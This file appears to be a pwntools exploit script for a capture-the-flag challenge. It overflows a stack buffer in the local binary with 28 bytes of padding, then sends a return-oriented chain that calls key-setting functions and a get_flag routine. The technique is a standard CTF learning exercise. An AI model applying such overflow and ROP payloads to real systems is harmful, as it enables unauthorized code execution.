from pwn import *
context.log_level='DEBUG'
p=process("./challenge")
#elf=ELF("./challenge")
#p=remote("challenges.auctf.com",30012)
pause()
def printlist():
	p.sendline(str("1"))
def OpenRoom():
	p.sendline(str("2"))
	p.recvline()
	p.sendlineafter("enter: ",str("4"))
def RoomInfo():
	p.sendline(str("3"))
def exploit():
	pop_ebp=0x565567e7
	get_key1=0x565566de
	get_key2=0x5655676e
	AA= 0x565567cd
	get_flag=0x5655686b
	set_key4=0x565567e9
	printlist()
	OpenRoom()
	RoomInfo()
	p.sendline("Stephen")
	payload = 'A'*28
	payload += p32(AA)
	payload += p32(get_key2)
	payload += p32(get_key1)
	payload += p32(pop_ebp)
	payload += p32(0xfeedc0de)
	payload += p32(set_key4)
	payload += p32(get_flag)
	p.sendline(payload)
	p.interactive()
if __name__ == '__main__':
	exploit()